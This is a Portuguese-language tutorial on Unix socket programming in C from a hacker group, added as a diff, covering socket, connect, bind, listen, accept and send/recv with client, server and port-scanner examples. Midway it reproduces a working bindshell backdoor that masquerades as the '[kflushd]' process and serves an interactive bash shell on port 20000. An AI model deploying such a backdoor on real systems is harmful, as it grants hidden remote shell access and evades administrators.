@@ -1,0 +1,965 @@
+
+
+
+                        U N S E K U R I T Y   T E A M
+
+
+Desenvolvido por Cs0 <uhbcso@base.com.br>
+Este tutorial e qualquer outro material do grupo unsek pode ser encontrado
+na homepage do grupo: http://unsekurity.virtualave.net/
+
+
+
+
+                                 Unix Sockets
+                                --------------
+                                    Parte I
+
+                  
+
+Indice
+
+          1 * Observacoes
+          2 * Introducao
+          3 * Funcoes, usos e definicoes
+          4 * Bibliografia
+          5 * Agradecimentos
+
+
+
+Observacoes
+===========
+
+	Este tutorial, bem como qualquer outro que eu vier a escrever, nao se
+responsabiliza pelo seu mau uso ou mau aprendizado. Tao pouco eh escrito
+para a "elite" ou para "kiddies".
+	Nao pretendo escrever amplamente sobre o assunto, se voce pretende
+algo mais procure outros materias na hp do unsekurity ou outros grupos.
+	Nao tenha somente esse txt como base de seu estudo. Pesquise sobre o
+assunto em outros pontos de referencia, manpages, outros textos ou consulte
+informacoes DDD :)
+
+
+**************
+* Introducao * 
+==============
+
+	Sockets sao programas responsaveis pela comunicacao de outros programas
+na internet. Quando voce estabelece conexao com algum computador, na verdade
+voce esta usando um socket.
+	Os sockets sao divididos em 'tipos'. Dos varios tipos de sockets,
+vamos abordar apenas 2, SOCK_STREAM e SOCK_DGRAM, onde trabalharemos com TCP
+e UDP respectivamente.
+	A programacao de sockets eh facilitada ao maximo por alguns headers:
+observe a lista abaixo:
+
+#include <sys/types.h>
+#include <sys/sockets.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+Caso necessite de mais headers (algumas situacoes exigem), consulte a
+manpage da funcao que voce deseja utilizar. Manpages servem para isso mesmo!
+
+
+******************************
+* Funcoes, usos e definicoes *
+==============================
+
+
+Declarando e usando sockets
+===========================
+
+Os sockets sao usados da mesma maneira que voce usa os arquivos. Nos
+arquivos voce declara um FILE *fp; e trata o fp como se fosse o proprio
+arquivo que seu programa meche. Nos sockets, voce declara atraves de um
+simples int ->  int meusocket;  e usa como um arquivo.
+
+#includes
+
+main ()
+{
+int sock;
+}
+
+Da mesma forma que, quando voce cria o ponteiro *fp voce linka-o para o
+arquivo desejado, voce devera tambem linkar o socket para a "conexao
+desejada".
+
+a funcao que faz essa ligacao eh a socket ()
+
+socket (familia, tipo, protocolo);
+
+familia:
+PF_UNIX, PF_LOCAL, PF_INET, PF_INET6, PF_IPX, PF_NETLINK, PF_X25, PF_AX25
+PF_ATMPVC, PF_APPLETALK, PF_PACKET, AF_INET, AF_UNIX, AF_ISO, AF_NS
+
+dessas muitas possibilidades, nos vamos trabalhar com AF_INET que eh a
+familia mais usada, pois trata de conexoes via internet ;)
+
+tipos:
+
+SOCK_STREAM, SOCK_DGRAM, SOCK_SEQPACKET, SOCK_RAW, SOCK_RDM, SOCK_PACKET
+
+desses nos vamos trabalhar com 2
+
+SOCK_STREAM       ->  TCP
+e 
+SOCK_DGRAM        ->  UDP
+
+protocolo:
+ip      0       IP      # internet protocol, pseudo protocol number
+icmp    1       ICMP    # internet control message protocol
+igmp    2       IGMP    # internet group multicast protocol
+ggp     3       GGP     # gateway-gateway protocol
+tcp     6       TCP     # transmission control protocol
+pup     12      PUP     # PARC universal packet protocol
+udp     17      UDP     # user datagram protocol
+idp     22      IDP     # WhatsThis?
+raw     255     RAW     # RAW IP interface
+
+ai esta a lista de protocolos, vamos trabalhar na nossa funcao com esses
+numeros listados. No caso vamos usar apenas o IP (0).
+
+
+/* Mano, voce ve que esse assunto eh tao extenso que fica bem claro que esse
+  texto muito limitado diante dele. */
+
+entao jah podemos contruir nosso socket:
+
+#includes
+
+main ()
+{
+int sock;
+
+sock = socket (AF_INET, SOCK_STREAM, 0);
+
+//caso queira usar UDP, basta alterar a segunda opcao:
+//sock = socket (AF_INET, SOCK_DGRAM, 0);
+}
+
+Pronto mano, jah sabemos construir um socket. Agora vamos passar para a
+proxima fase
+
+
+Definindo estrutura da conexao
+==============================
+
+Os dados do host na conexao sao definidos atraves de uma estrutura (struct).
+A struct usada para conexoes via internet eh a sockaddr_in.
+
+vejamos abaixo como ela eh definida:
+
+ struct sockaddr_in
+  {
+  short int sin_family;         Familia
+  unsigned short int sin_port;  Porta
+  struct in_addr sin_addr;      IP
+  unsigned char sin_zero[8];    Zera a estrutura
+  }
+
+agora vejamos a struct in_addr, definida na struct acima:
+
+ struct in_addr
+  {
+  unsigned long s_addr;
+  }
+
+* funcao htons e htonl *
+
+como diz a manpage:
+* htonl,  htons,  ntohl, ntohs - converte valores entre host
+* e network por ordem.
+
+Ou em outras palavras: converte o numero em si em valor de rede
+ex: htons (80);  80 eh um numero int (inteiro) mas a funcao "transforma" o 
+numero 80 em "porta 80".
+
+
+Entao vamos ao exemplo pratico de como construir uma estrutura de conexao:
+
+#includes
+main ()
+{
+
+int meusocket;
+struct sockaddr_in minharede;
+
+meusocket = socket (AF_INET, SOCK_STREAM, 0);
+
+minharede.sin_family = AF_INET;     => familia
+minharede.sin_port = htons (80);    => funcao htons jah vista (abri a porta 80)
+minharede.sin_addr.s_addr = inet_addr ("192.168.0.1");       => IP
+bzero(&(minharede.sin_zero),8);     => zera o resto da struct
+}
+
+Vamos analizar as funcoes novas:
+bzero () e inet_addr ()
+
+inet_addr (), falando de modo curto e grosso, converte a string IP em IP.
+Ou seja, inet_addr ("192.168.0.1"); converte o "192.168.0.1" em IP
+192.168.0.1
+
+bzero () eh uma funcao que escreve zeros para uma string. No nosso caso, 
+serve para zerar o resto da struct. 
+
+void bzero (void *s, int n);
+pega os primeiros "n" bytes da string apontada em s e muda-os para zero.
+
+
+Jah sabemos montar uma estrutura de conexao e iniciar um socket, entao vamos
+passar para uma nova fase:
+
+funcao connect ()
+=================
+
+Essa funcao eh a responsavel por estabelecer uma conexao. Sua sintaxe eh:
+
+connect  (socket, estrutura de conexao , tamanho da estrutura);
+
+exemplo:
+
+#includes
+
+main ()
+{
+int sock;
+struct sockaddr_in network;
+
+sock = socket (AF_INET, SOCK_STREAM, 0);
+
+bzero ((char *)&network);       //Zerei a struct
+
+network.sin_family = AF_INET;
+network.sin_port = htons (23);  //Telnet ;)
+network.sin_addr.s_addr = inet_addr ("127.0.0.1");
+
+connect (sock, (struct sockaddr *)&network, sizeof (network));
+
+}
+
+pronto, ate ai jah estabelecemos conexao.
+
+para incrementar nosso programa, vamos utilizar alguns acessorios:
+
+1:
+
+#include <errno.h>
+
+funcao perror ()    => eh como se fosse um "print error"
+
+e x e m p l o:
+
+int sock;
+sock = socket (AF_INET, SOCK_STREAM, 0);
+
+if (sock == -1)
+  {
+  perror ("Socket Error");
+  exit (-1);
+  }
+
+Se nao puder abrir socket, o programa cai e o sistema mostra a mensagem de
+erro.
+
+2:
+
+gethostbyname ()
+================
+
+As vezes voce nao quer digitar o IP da vitma, prefere digitar o dominio.
+Essa funcao permite que se utilize o dominio em vez do ip ex:
+
+#include <netdb.h>
+
+struct hostent *  gethostbyname (char *name);
+
+"name" eh o ponteiro que deve ser apontado para o dominio
+
+A funcao retorna um ponteiro para uma struct hostent. A estrutura esta
+definida abaixo:
+
+struct  hostent
+ {
+ char    *h_name;        /* Nome oficial do host */
+ char    **h_aliases;    /* Lista de aliases */
+ int     h_addrtype;     /* Tipo de endereco do host */
+ int     h_length;       /* Tamanho do endereco */
+ char    **h_addr_list;  /* Lista de enderecos vindos do seridor de nomes */
+ };
+
+e o array h_addr_list possui como primeiro endereco h_addr, que retorna o
+IP. Ou seja, ela faz o processo inverso Nome de dominio -> Endereco IP.
+(Caso tenha duvidas, consulte um livro de TCP/IP ou textos na homepage do
+unsekurity team ou qualquer outro grupo que preste ;))
+
+getservbyport ()
+================
+
+Traduzindo o nome dela: get service by port  -  Obtendo servico por porta.
+Isso quer dizer que essa funcao retorna qual servico esta rodando na porta.
+
+#include <netdb.h>
+
+struct servent *getservbyport(int port, const char *proto);
+
+
+struct servent
+ {
+ char    *s_name;        /* Nome oficial do servico */
+ char    **s_aliases;    /* lista de aliases */
+ int     s_port;         /* numero da porta */
+ char    *s_proto;       /* protocolo que voce precisa usar para conectar-se
+                            ao servico */ 
+ }
+ 
+Vamos a um exemplo, um programinha q retorna o IP do host
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <netinet/in.h>
+
+main (int argc, char * * argv)
+{
+
+struct hostent *he;
+int sock;
+
+if (argc < 2)
+  {
+  printf ("Use %s <host>\n\n", argv [0]);
+  exit (0);
+  }  
+
+sock = socket (AF_INET, SOCK_STREAM, 0);  //Nao precisa, mas eh bom ilustrar
+
+if (sock == -1)
+  {
+  perror ("Socket");
+  exit (0);
+  }
+
+he = gethostbyname (argv [1]);
+
+if (he == NULL)
+  {
+  herror("Erro");
+  exit(1);
+  }
+printf("IP: %s\n",inet_ntoa(*((struct in_addr *)he->h_addr)));
+}
+
+   Este programa nao tem nada de util, mas como estamos aprendendo ainda, vamos
+ter calma e continuar nosso pequeno curso.
+
+   Este texto nao eh voltado para a elite, aki voce nao vai encontrar
+material de alto nivel, tao pouco linguagens tecnicas. Todo ele foi feito
+com o interesse voltado para o publico newbie. Entenda: Newbie eh akele
+que busca informacoes para crecer, no entanto, ainda esta no inicio. Newbie
+eh diferente de lamer, q sao os caras q jah chegam contando mil vantagens
+esperando serem aceitos ou serem famosos. Eles so enganam os pobres newbies
+e os outros lamers. Por isso, cuidado mano! se voce se gaba muito nos chats
+ou nos foruns, eh bom se olhar no espelho e refletir se voce esta sendo um
+lamer!
+   Acredito que o publico que chegou ateh aki, nao esta interessado em
+receitas de bolo ou exploits feitos pelo grupo x, ou o y, ou z, ou o w,
+ou o Lords of num sei o q. Acredito que voce quer continuar sozinho e
+escrever seus proprios.
+
+vamos a outro exemplo
+
+/*
+Simples portscan com uso da funcao connect () para efeito demonstrativo
+Desenvolvido por Cs0
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <errno.h>
+
+#define ERRO -1
+
+main (int argc, char * * argv)
+{
+
+struct hostent *he;
+struct servent *portserv;        //Estruturas de conexao jah estudadas
+struct sockaddr_in network;
+
+int sock, 
+    portas,             
+    startport,
+    endport,
+    resp;
+
+if (argc < 4)
+  {
+  printf ("Use %s <host> <startport> <endport>\n\n", argv [0]);
+  exit (0);
+  }
+
+/* Definindo valores */
+
+portas = 0;
+startport = atol (argv [2]);
+endport = atol (argv [3]);
+
+for (portas = startport; portas <= endport ; portas++)
+  {
+
+  he = gethostbyname (argv [1]);
+  if (he == NULL)
+    {
+    herror ("Scan");
+    exit(ERRO);
+    }
+
+  sock = socket (AF_INET, SOCK_STREAM, 0);
+
+  if (sock == -1)
+    {
+    perror ("Socket");
+    exit (0);
+    }
+
+  bzero ((char *)&network, sizeof (network));
+  network.sin_family = he->h_addrtype;
+  network.sin_port = htons (portas);
+  network.sin_addr = *(struct in_addr *)he->h_addr;
+
+  resp = connect (sock, (struct sockaddr_in *)&network, sizeof (network));
+
+  if (resp == ERRO)
+    {
+    }
+  else
+    {
+    portserv = getservbyport (htons(portas),"tcp");
+ 
+    if (portserv != NULL)
+      {
+      printf ("%d - %s\n", portas, portserv->s_name);
+      }
+    else
+      {
+      printf ("%d - %s\n", portas, "Desconhecido");
+     }
+    }
+  close (sock);
+  }
+}
+
+Este portscan eh bem ruim, mas com ele podemos ilustrar bem as funcoes
+gethostbyname (), getservbyport () e a funcao connect ().
+
+Ate aqui nos jah aprendemos a declarar um socket e a usa-lo para se conectar
+a um servidor. Agora resta-nos saber como mandar strings atraves dessa
+conexao e como fazer nosso proprio servidor. Manos, essa parte exige um
+pouco de atencao: Ponha aquela MP3 para tocar, beba um pouco de cafe, arrume
+a poltrona [:)] e maos `a obra!
+
+Iremos comecar aprendendo a montar um servidor para receber uma conexao do
+nosso proprio client ;). Sao muitas as possibilidades para atividades
+fucadoras q esse estudo trara. Criatividade eh a arma mais forte.
+
+bind ()
+=======
+
+Bind serve para unir um nome ao socket que voce abriu. Para que fique bem
+claro, observe abaixo:
+
+
+IP do servidor:  200.234.56.43
+IP do cliente:   200.245.34.133
+
+Para que o cliente localizado em 200.245.34.133 se comunique com um programa
+(servidor) localizado em 200.234.56.43, eh necessario que os dois se
+comuniquem por um canal em comum: uma porta. Conexoes telnet sao feitas
+normalmente pela porta 23, ftp pela 21, http pela 80 etc.... A diferenciacao
+entre os tipos de servico estah pela porta que este abre. Entao se eu for
+mandar uma mensagem para o servidor, esta tem q ir por uma porta aberta no
+sistema, especifica para aquele programa servidor. A funcao bind () faz o
+papel de abrir a porta no sistema.
+
+Estando claro isso, vamos prosseguir:
+
+A sintaxe da bind () eh:
+
+int bind (socket, estrutura de conexao (local), tamanho da estrutura);
+
+estrutura de conexao (local): Diferentemente das outras funcoes, aqui voce
+vai utilizar uma struct inetaddr_in local, ou seja, a struct devera ser
+voltada para a maquina local.
+ex:
+struct sockaddr_in local;
+
+local.sin_family = AF_INET;
+local.sin_port = htons (80);
+local.sin_addr.s_addr = inet_addr ("127.0.0.1"); //ou = INETADDR_ANY
+
+Nosso codigo do servidor esta assim:
+
+#includes
+
+#define PORTA 2003
+
+main ()
+{
+
+int sock;
+struct sockaddr_in local;
+
+sock = socket (AF_INET, SOCK_STREAM, 0);
+
+bzero ((char *)&local, sizeof (local));
+
+local.sin_family = AF_INET;
+local.sin_port = htons (PORTA);
+local.sin_addr.s_addr = INETADDR_ANY;
+
+bind (sock, (struct sockaddr *)&local , sizeof(local));
+
+listen ()
+=========
+
+Esta funcao faz com que um socket aguarde por conexoes.
+Sua sintaxe eh:
+
+listen (socket, numero maximo de conexoes);
+
+ex:
+int sock;
+sock = socket (AF_INET, SOCK_STREAM, 0);
+(...)
+listen (sock, 3); /* apenas 3 clients podem se conectar nesse socket. */
+
+accept ()
+=========
+
+Estabelece conexoes em um socket. Ela cria um novo socket com as mesmas
+propriedades do socket anterior do seu programa e aloca um novo "int socket"
+para a nova conexao. Veja o exemplo:
+
+int sock,
+    newSock,   // Este sera o novo socket
+    tamanho;
+sock = socket (AF_INET, SOCK_STREAM, 0);
+
+(...)
+
+tamanho = sizeof (struct sockaddr);
+
+listen (sock, 3);
+newSock = accept (sock, (struct sockaddr_in *)&remote, &tamanho);
+
+
+Como voce pode ver a sintaxe eh:
+
+novo socket = accept (socket, estrutura de conexao, tamanho);
+
+
+Vejamos agora como esta nosso servidor:
+#includes
+
+#define PORTA 2003
+
+main ()
+{
+int sock,
+    newSock,
+    tamanho;
+struct sockaddr_in local,
+                   network;
+
+sock = socket (AF_INET, SOCK_STREAM, 0);
+
+bzero ((char *)&local, sizeof (local));
+
+local.sin_family = AF_INET;
+local.sin_port = htons (PORTA);
+local.sin_addr.s_addr = INETADDR_ANY;
+
+bind (sock, (struct sockaddr *)&local , sizeof(local));
+listen (sock, 3);
+
+tamanho= sizeof (network);
+newSock = accept (sock, (struct sockaddr *)&network, &tamanho);
+
+close (sock);    /*  nao eh mais necessario o socket antigo, a conexao  *
+                  *  jah foi estabelecida com o client                  */
+
+}
+
+Podemos tirar proveito disso construindo uma backdoor simples, basta
+acrescentar o uso das funcoes dup2 (); e execl ();
+
+Um exemplo bem pratico se encontra no tutorial de sockets (parte I) do nash
+leon (coracaodeleao) tambem disponivel na homepage do grupo.
+Eis ai o exemplo:
+
+Esse programa copia uma shell p/ uma determinada porta,ele eh amplamente
+difundido na Internet com o nome de bindshell,mas possui muitas variacoes,
+p/ propositos educacionais eu criei uma backdoor baseada nesse programa,
+de modo que tornasse mais claro o nosso aprendizado.
+
+/* Backdoor em Socket simples...by Nash Leon
+   Thanks Ramona e  Unsekurity Team.
+   nashleon@yahoo.com.br
+   http://unsekurity.virtualave.net
+   Compile usando:
+   $gcc -o back back.c 
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <strings.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <signal.h>
+
+#define MINHA_PORTA 20000
+#define BACKLOG        5
+
+int main(int argc, char *argv[])
+{
+
+   int Meusocket, Novosocket, tamanho;
+   struct sockaddr_in local;
+   struct sockaddr_in remote;
+
+/* Cria um processo crianca ou menor, p/ nao necessitar executar
+   usando & */
+if(fork() == 0){
+   
+/* Aqui segue a esperteza..se alguem der ps aux,top, ou ver os processos
+   que estao rodando verah o que estah copiado abaixo,no caso [kflushd],
+   mude isso conforme o sistema onde serah executada a backdoor */
+
+   strcpy(argv[0], "[kflushd]");
+   signal(SIGCHLD, SIG_IGN);
+
+/* Criando a estrutura local(servidor) */
+
+   bzero(&local, sizeof(local));
+   local.sin_family = AF_INET;
+   local.sin_port = htons(MINHA_PORTA);
+   local.sin_addr.s_addr = INADDR_ANY;
+   bzero(&(local.sin_zero), 8);
+
+/* Declaracao do socket(),bind() e listen() */
+
+Meusocket=socket(AF_INET, SOCK_STREAM, 0);
+bind(Meusocket, (struct sockaddr *)&local, sizeof(struct sockaddr));
+listen(Meusocket, BACKLOG);
+tamanho = sizeof(struct sockaddr_in);
+
+/* O velho while(1) p/ ser usado com nosso novo accept() */
+
+   while(1)
+     {
+        if((Novosocket=accept(Meusocket, (struct sockaddr *)&remote,&tamanho)) 
+          {
+             perror("accept");
+             exit(1);
+          }
+
+        if(!fork())
+          {
+
+
+             close(0); close(1); close(2);
+
+             /* dup2() aqui eh usado p/ criar uma copia de Novosocket */
+
+             dup2(Novosocket, 0); dup2(Novosocket, 1); dup2(Novosocket,2);
+
+             /* Entao a shell eh executada,nesse caso uma bash
+                Mude-a p/ qualquer uma que quiser, e atencao ao
+                parametro -i, nem todas aceitam shell interativa */
+
+             execl("/bin/bash","bash","-i", (char *)0);
+             close(Novosocket);
+             exit(0);
+          }
+
+     }
+   }
+   return(0);
+}
+
+Ate aqui nosso programa jah estabelece conexao com o client. Mas ainda nao
+tem nenhuma utilidade pratica. Para servir a algum proposito, eh necessario
+que seja trocado informacoes entre os programas. Vejamos agora entao como
+mandar e receber strings:
+
+Mandando e recebendo strings
+****************************
+
+send ()
+=======
+Usada para enviar uma mensagem para um socket.
+Sua sintaxe eh:
+
+int Send (socket, *mensagem, tamanho da mensagem, parametros adicionais)
+
+parametros adicionais podem ser:
+
+#define MSG_OOB           0x1     /* process out-of-band data*/
+#define MSG_DONTROUTE     0x4     /* bypass routing, usedirect interface */
+#define MSG_DONTWAIT      0x40    /* don't block */
+#define MSG_NOSIGNAL      0x2000  /* don't raise SIGPIPE */
+
+MSG_OOB - Envia mensagens Out-Of-banda (OOB) - fora de banda - para sockets
+          que suportam esse tipo de mensagem. Esse tipo de parametro eh o
+          calcanhar de aquiles do Windows 95, que trava com uma mensagem OOB
+          (famoso winnuke)
+
+MSG_DONTROUTE - Usado como debugador, para encontrar problemas
+
+MSG_DONTWAIT  - Permite operacoes "non-blocking"
+
+MSG_NOSIGNAL  - Nao manda SIGPIPE em erros em sockets stream quando o outro
+                endereco quebra a conexao. 
+
+exemplo de utilizacao:
+
+char cso [] = "Elite: fora daqui! ;)"
+
+(...)
+
+send (newSock, cso, sizeof (cso), 0); //Sem parametros adicionais
+
+recv ()
+=======
+
+Usada para receber mensagens de um socket. Sua sintaxe eh:
+
+int recv (socket, *buffer, tamanho, flags);
+
+flags podem ser:
+
+MSG_OOB, MSG_PEEK, MSG_WAITALL, MSG_ERRQUEUE, MSG_NOSIGNAL.
+
+Como nao nos interessa no momento, vamos deixar essa parte para outros
+tutoriais.
+
+
+Vamos a um exemplo pratico: Servidor que recebe strings enviadas pelo
+client na porta 20032
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/wait.h>
+
+#define PORTA 20032
+#define ERRO -1
+#define TAMMAX 250     //tamanho maximo da string
+
+main ()
+{
+
+struct sockaddr_in network,
+                   local;
+int sock,
+    newSock,
+    resp,
+    strucsize;
+
+char msgbuffer [TAMMAX];
+
+sock = socket (AF_INET, SOCK_STREAM, 0);
+if (sock == ERRO)
+  {
+  perror ("Socket");
+  exit (0);
+  }
+bzero ((char *)&local, sizeof (local));
+local.sin_family = AF_INET;
+local.sin_port = htons (PORTA);
+local.sin_addr.s_addr = INADDR_ANY;
+
+strucsize = sizeof (local);
+
+resp = bind (sock, (struct sockaddr *)&local, strucsize);
+
+if (resp == ERRO)
+  {
+  perror ("Bind");
+  exit (0);
+  }
+
+listen (sock, 5);
+
+newSock = accept (sock, (struct sockaddr *)&network, &strucsize);
+
+if (newSock == ERRO)
+  {
+  perror ("Accept");
+  exit (0);
+  }
+
+fprintf (stdout, "Recebendo conexao de: %s\n", inet_ntoa (network.sin_addr));
+
+for (;;)
+  {
+  recv (newSock, msgbuffer, TAMMAX, 0);
+  fprintf (stdout, "\nMensagem Recebida: %s\n", msgbuffer);
+  if (!strcmp (msgbuffer, "exit"))
+    {
+    exit (0);
+    }
+  }
+}
+
+E agora, um cliente para o servidor acima:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/wait.h>
+
+#define PORTA 20032
+#define ERRO -1
+#define TAMMAX 250     //tamanho maximo da string
+
+main (int argc, char * * argv)
+{
+
+struct sockaddr_in network;
+
+int sock,
+    newSock,
+    resp,
+    strucsize;
+
+char msg [TAMMAX];
+
+if (argc < 2)
+  {
+  printf ("Use %s <host>\n\n", argv [0]);
+  exit (0);
+  }
+
+sock = socket (AF_INET, SOCK_STREAM, 0);
+
+if (sock == ERRO)
+  {
+  perror ("Socket");
+  exit (0);
+  }
+
+bzero ((char *)&network, sizeof (network));
+network.sin_family = AF_INET;
+network.sin_port = htons (PORTA);
+network.sin_addr.s_addr = inet_addr (argv [1]);
+
+strucsize = sizeof (network);
+
+resp = connect (sock, (struct sockaddr *)&network, strucsize);
+
+if (resp == ERRO)
+  {
+  perror ("Connect");
+  exit (0);
+  }
+
+fprintf (stdout, "Conectado em %s\n", argv [1]);
+
+for (;;)
+  {
+  printf ("\nMensagem: ");
+  scanf ("%250s", &msg);
+  send (sock, msg, sizeof (msg), 0);
+  if (!strcmp (msg, "exit"))
+     {
+     exit (0);
+     }
+   }
+}
+
+Aih esta mano, agora nos sabemos criar uma conexao e enviar/receber dados.
+Agora resta-nos usar nossa criatividade e trabalhar em cima desse novo
+conhecimento.
+
+Vamos dar continuidade ao nosso estudo aprendendo duas novas funcoes
+read () e write ()
+
+
+write ()
+========
+Tambem eh usada para enviar mensagens para um socket. Sua sintaxe eh:
+
+int write (socket, *buffer, tamanho utilizado do buffer);
+
+ex:
+
+write (sock, msg, strlen (msg));
+/*
+Voce pode substituir a funcao send () no programa acima por esta.
+*/
+
+read ()
+=======
+Assim como recv (), eh usada para ler mensagens enviadas de um socket. Sua
+sintaxe eh igual a da funcao write ():
+
+int read (socket, *buffer, tamanho utilizado do buffer);
+
+ex:
+
+read (sock, msg, strlen (msg));
+
+/*
+Voce pode substituir a funcao recv () no programa acima por esta.
+*/
+
+****************
+* Bibliografia *
+================
+
+Beej tutorial        -   http://www.ecst.csuchico.edu/~beej/guide/net
+Exemplo de backdoor  -   http://unsekurity.virtualave.net/txts/sockets.txt
+Manpages
+
+******************
+* Agradecimentos *
+==================
+
+Agradecimentos ao pessoal do Unsekurity team: Nash Leon, module, psych,
+xf86config, e-brain, raynox, t[rex], klogd, xcarioca e segfault. E tambem
+aos leitores dos nossos textos.
+Agradeco a elite por se manter longe dos meus txts e aos lamers por nao se
+interessarem em ler isso ;). 
+
+                                                                  C
+                                                                  s 
+                                                                 e0f
